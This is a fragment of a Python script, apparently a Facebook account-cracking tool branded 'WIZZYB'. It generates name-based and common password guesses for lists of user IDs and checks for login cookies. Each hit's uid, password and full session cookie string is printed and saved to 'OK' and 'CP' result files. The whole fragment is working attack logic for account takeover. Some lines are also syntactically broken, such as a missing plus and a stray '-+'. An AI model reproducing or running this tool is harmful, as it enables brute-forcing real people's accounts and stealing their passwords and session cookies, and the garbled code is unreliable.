...
def bapi(user):
	...
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"111", name"1122", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
	elif len(name)<=2:
		pwx = [ name, name+"1", name+"12", name+"1122", name+"12", name-+"000", name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
	elif len(name)<=3:
...
def mbasic(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[0;97m[\033[0;93mWIZZYB_Cracking\033[0;97m]\033[0;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"111", name+"123", name+"1234", name+"12345", "123456", "223344", "334455", "445566", "password" ]
	...
	def main(user):
		...
		try:
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r\033[1;97m[\033[1;92mWIZZYB-OK\033[1;97m]\033[1;92m %s | %s | %s"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					print("\r\033[1;97m[\033[1;91mWIZZYB-CP\033[1;97m]\033[1;91m %s|%s\033[0;91m"%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
